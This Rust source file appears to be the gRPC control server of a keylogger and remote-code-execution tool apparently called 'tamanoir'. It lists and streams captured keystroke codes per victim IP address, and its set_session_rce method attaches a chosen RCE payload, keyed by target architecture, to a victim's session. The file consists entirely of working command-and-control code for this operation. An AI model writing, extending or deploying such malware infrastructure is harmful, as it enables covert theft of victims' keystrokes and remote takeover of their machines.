use std::{collections::HashMap, net::Ipv4Addr, pin::Pin, str::FromStr};

use log::{debug, info};
use tokio_stream::Stream;
use tonic::{transport::Server, Request, Response, Status};

use crate::{
    tamanoir_grpc::{
        proxy_server::{Proxy, ProxyServer},
        ListSessionsResponse, NoArgs, SessionResponse, SetSessionRceRequest,
    },
    Session, SessionsStore, TargetArch,
};

pub async fn serve_tonic(grpc_port: u16, sessions_store: SessionsStore) -> anyhow::Result<()> {
    let addr = format!("0.0.0.0:{}", grpc_port).parse().unwrap();
    info!("Starting grpc server");
    debug!("Grpc server is listening on {}", addr);
    Server::builder()
        .add_service(ProxyServer::new(sessions_store))
        .serve(addr)
        .await?;
    Ok(())
}

#[tonic::async_trait]
impl Proxy for SessionsStore {
    async fn list_sessions(
        &self,
        request: Request<NoArgs>,
    ) -> Result<Response<ListSessionsResponse>, Status> {
        debug!(
            "<GetSessions> Got a request from {:?}",
            request.remote_addr()
        );
        let current_sessions = self.sessions.lock().await;

        let mut sessions: Vec<SessionResponse> = vec![];
        for s in current_sessions.values().into_iter() {
            sessions.push(SessionResponse {
                ip: s.ip.to_string(),
                key_codes: s.key_codes.iter().map(|byte| *byte as u32).collect(),
            })
        }

        let reply = ListSessionsResponse { sessions };
        Ok(Response::new(reply))
    }

    async fn set_session_rce(
        &self,
        request: Request<SetSessionRceRequest>,
    ) -> Result<Response<NoArgs>, Status> {
        debug!(
            "<SetSessionRce> Got a request from {:?}",
            request.remote_addr()
        );
        let req = request.into_inner();
        let ip = Ipv4Addr::from_str(&req.ip)
            .map_err(|_| Status::new(402.into(), format!("{}: invalid ip", req.ip)))?;

        let mut current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
            self.sessions.lock().await;
        let target_arch = TargetArch::from_str(&req.target_arch).map_err(|_| {
            Status::new(
                402.into(),
                format!("{}: unknown target arch", req.target_arch),
            )
        })?;
        match current_sessions.get_mut(&ip) {
            Some(existing_session) => {
                match existing_session.set_rce_payload(&req.rce, target_arch) {
                    Ok(_) => Ok(Response::new(NoArgs {})),
                    Err(_) => Err(Status::new(404.into(), format!("{}: invalid rce", req.rce))),
                }
            }
            None => Err(Status::new(
                404.into(),
                format!("{}: session not found", ip),
            )),
        }
    }
    type WatchSessionsStream =
        Pin<Box<dyn Stream<Item = Result<SessionResponse, Status>> + Send + 'static>>;

    async fn watch_sessions(
        &self,
        _request: Request<NoArgs>,
    ) -> Result<Response<Self::WatchSessionsStream>, Status> {
        let mut rx = self.tx.subscribe();

        let stream = async_stream::try_stream! {
        while let Ok(maybe_session) = rx.recv().await {
            if let Some(session) = maybe_session {
               yield SessionResponse {
                    ip: session.ip.to_string(),
                    key_codes: session.key_codes.iter().map(|byte| *byte as u32).collect(),
                };

            }
        }
        println!(" /// done sending");};
        Ok(Response::new(Box::pin(stream) as Self::WatchSessionsStream))
    }
}
